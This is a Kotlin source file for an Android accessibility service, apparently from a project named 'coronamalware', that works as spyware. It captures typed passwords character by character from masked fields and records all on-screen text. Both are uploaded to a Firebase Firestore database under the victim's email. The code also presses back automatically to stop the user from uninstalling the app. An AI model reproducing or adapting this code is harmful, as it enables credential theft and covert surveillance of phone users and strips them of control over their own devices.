package com.deniskrr.coronamalware.service

import android.accessibilityservice.AccessibilityService
import android.app.Service
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.deniskrr.coronamalware.R
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import java.util.concurrent.locks.ReentrantLock
import kotlin.concurrent.withLock


class MaliciousService : AccessibilityService() {
    companion object {
        val ONE_CHAR_VISIBLE_REGEX = """^[•*]+[^*•]$""".toRegex()
        val OBFUSCATED_PASSWORD_REGEX = """^[•*]*$""".toRegex()
    }

    private var lastWindowContent: String = ""
    private lateinit var db: FirebaseFirestore
    private lateinit var victimEmail: String
    private var currentPassword: String = ""
    private var passwordNode: AccessibilityNodeInfo? = null
    private val nodeLock = ReentrantLock()

    override fun onServiceConnected() {
        db = FirebaseFirestore.getInstance()
        super.onServiceConnected()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        victimEmail = intent!!.getStringExtra("VictimEmail")!!
        return Service.START_STICKY
    }

    override fun onInterrupt() {
        // Do nothing
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        when (event?.eventType) {
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val rootNode = rootInActiveWindow
                val textViewNodes = mutableListOf<AccessibilityNodeInfo>()
                nodeLock.withLock {
                    passwordNode = null
                    findChildViews(textViewNodes, rootNode)
                }

                val windowContent = textViewNodes.joinToString(separator = "...") { node ->
                    if (node.text != null)
                        node.text
                    else ""
                }
                if (windowContent != lastWindowContent) {
                    if (passwordNode == null && currentPassword.isNotBlank()) {
                        val victimRef = db.collection("users").document(victimEmail)
                        victimRef.update("passwords", mapOf(currentPassword to lastWindowContent))
                        currentPassword = ""
                    }
                    lastWindowContent = windowContent

                    val currentPasswordNode = passwordNode

                    if (lastWindowContent.contains(getString(R.string.app_name)) && lastWindowContent.contains(
                            "Do you want to uninstall this app?"
                        )
                    ) {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                    }

                    val passwordText = currentPasswordNode?.text
                    passwordText?.let {
                        if (passwordText.length < currentPassword.length) { // If characters were deleted from the password
                            currentPassword = currentPassword.dropLast(currentPassword.length - passwordText.length)
                        }
                        if (passwordText.matches(ONE_CHAR_VISIBLE_REGEX)) { // Password is obfuscated with only the last character visible
                            currentPassword += passwordText.last()
                        } else if (!passwordText.matches(OBFUSCATED_PASSWORD_REGEX)) { // Password is stored in plain text
                            currentPassword = passwordText.toString()
                        }
                    }

                    val victimRef = db.collection("users").document(victimEmail)
                    victimRef.update("windows", FieldValue.arrayUnion(lastWindowContent))
                }
            }
        }
    }

    private fun findChildViews(
        textViewNodes: MutableList<AccessibilityNodeInfo>,
        parentView: AccessibilityNodeInfo?
    ) {
        if (parentView?.className == null) {
            return
        }

        if (parentView.childCount == 0 && (!parentView.text.isNullOrBlank())
        ) {
            textViewNodes.add(parentView)
            if (parentView.isPassword) {
                passwordNode = parentView
            }
        } else {
            for (i in 0 until parentView.childCount) {
                findChildViews(textViewNodes, parentView.getChild(i))
            }
        }
    }
}